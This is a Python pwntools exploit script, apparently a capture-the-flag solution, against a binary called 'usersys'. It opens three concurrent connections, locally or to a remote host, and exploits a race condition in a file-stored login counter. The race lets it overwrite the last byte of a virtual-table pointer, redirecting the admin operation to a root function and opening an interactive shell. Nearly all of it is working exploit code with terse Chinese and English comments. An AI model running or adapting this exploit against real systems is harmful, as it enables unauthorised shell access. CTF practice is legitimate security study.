from pwn import *
import sys

context(
    terminal = ['tmux','splitw','-h'],
    os = "linux",
    arch = "amd64",
    log_level="debug",
)

def Guest(content):
    io1.sendlineafter(b'guest]',b'guest')
    io1.sendlineafter(b'[y/n]',b'y')
    io1.sendafter(b'>>>',content)

def debug(io):
    gdb.attach(io,
'''
b operation
c    
''')

Mode = sys.argv[1]
if Mode == 'remote':
    HOST = sys.argv[2]
    PORT = sys.argv[3]
    io1 = remote(HOST,PORT)
# 首先创建io1

if Mode == 'local':
    io1 = process("./usersys")
    debug(io1)

Guest(b'aa')
Guest(b'aa')
Guest(b'aa')
Guest(b'aa')
# io1 write 4 name to the guest_book
# login_count = 4

io1.sendlineafter(b'guest]',b'guest')
# 并且第五次进入Guest的时候停留在程序询问是否留下名字的地方

# start io2,io3 now
if Mode == 'remote':
    io2 = remote(HOST,PORT)
    io3 = remote(HOST,PORT)

if Mode == 'local':
    io2 = process("./usersys")
    io3 = process("./usersys")
    debug(io2)
    debug(io3)

io2.sendlineafter(b'guest]',b'guest')
io3.sendlineafter(b'guest]',b'guest')
# io2,io3趁着login_count还没到5，也一起进入程序询问guest是否留下名字的地方。

# io2,io3 wait until io1 finish
io1.sendlineafter(b'[y/n]',b'y')
io1.sendafter(b'>>>',b'haha')
# 接下来第一个连接过掉，至此login_count在文件中的内容已经是5了。第一个连接利用完毕

# io2 write to the login_count
io2.sendlineafter(b'[y/n]',b'y')
io2.sendafter(b'>>>',p16(10))
# io2输入y，继续运行程序，由于上文说到的关键漏洞点
# io2的程序会读取到文件中的login_count，所以login_count在内存中也为5
# io2在login_count写上0xa，为io3的利用做准备
# 此时io2退出guest，login_count再加一并写入文件，即为0xb

# io3 write the key to admin virtual table function address
io3.sendlineafter(b'[y/n]',b'y')
io3.sendafter(b'>>>', b'\x50')
# io3输入y，继续运行程序，程序同样的从文件中读取login_count为刚刚io2写的0xb
# 刚好到admin的operation虚表地址，写入root虚表的最后一字节0x50，退出guest
# 再进入admin，进入root的operation函数，拿到shell。

io3.sendlineafter(b'guest]',b'admin')

io3.interactive()
